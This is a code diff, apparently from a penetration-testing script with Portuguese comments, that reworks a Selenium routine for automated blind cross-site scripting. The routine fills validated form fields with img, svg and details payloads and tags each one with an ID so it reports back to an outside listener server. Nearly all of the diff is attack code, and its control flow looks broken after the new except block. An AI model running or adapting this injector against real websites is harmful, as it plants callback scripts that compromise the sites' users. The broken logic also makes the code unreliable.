@@ -329,13 +329,26 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
     injected_payloads = []
     
     try:
-        # Cria payloads com o link do servidor ouvinte
-        payloads = build_payloads(url_ouvinte)
-        for payload in payloads:
-            for campo in campos_validos:
+        for campo in campos_validos:
+            # Usa diretamente os campos que já foram validados pelo eco_test
+            field_name = campo['element'].get('name') or campo['element'].get('id')
+            field_id = campo['element'].get('id')
+            
+            for payload_type in ['img', 'svg', 'details']:  # Um payload de cada tipo por campo
                 try:
-                    # Usa diretamente os campos que já foram validados pelo eco_test
-                    field_name = campo['element'].get('name') or campo['element'].get('id')
+                    # Registra o payload e obtém ID único
+                    payload_id = registrar_payload_injetado(
+                        campo_id=field_id,
+                        campo_name=field_name,
+                        payload=f"payload_{payload_type}",
+                        url_origem=original_url
+                    )
+                    
+                    # Cria payload com ID específico
+                    payloads = build_payloads(url_ouvinte, payload_id)
+                    payload = payloads[0] if payload_type == 'img' else \
+                             payloads[1] if payload_type == 'svg' else payloads[2]
+                    
                     # Encontra o elemento novamente
                     if campo['element']['id']:
                         input_field = driver.find_element(By.ID, campo['element']['id'])
@@ -343,16 +356,24 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                         input_field = driver.find_element(By.NAME, campo['element']['name'])
                     else:
                         continue
+ 
                     # Injeção blind XSS
                     input_field.clear()
                     input_field.send_keys(payload)
                     input_field.send_keys(Keys.RETURN)
                     
                     injected_payloads.append({
+                        'payload_id': payload_id,
                         'payload': payload,
                         'field_name': field_name,
                         'status': 'injected'
                     })
+                    
+                    print(f"[+] Payload {payload_id} injetado no campo {field_name}")
+                    
+                except Exception as e:
+                    print(f"[!] Falha ao injetar payload no campo {field_name}: {e}")
+                    continue
                     
                     # Verifica se mudou de página após a injeção
                     try:
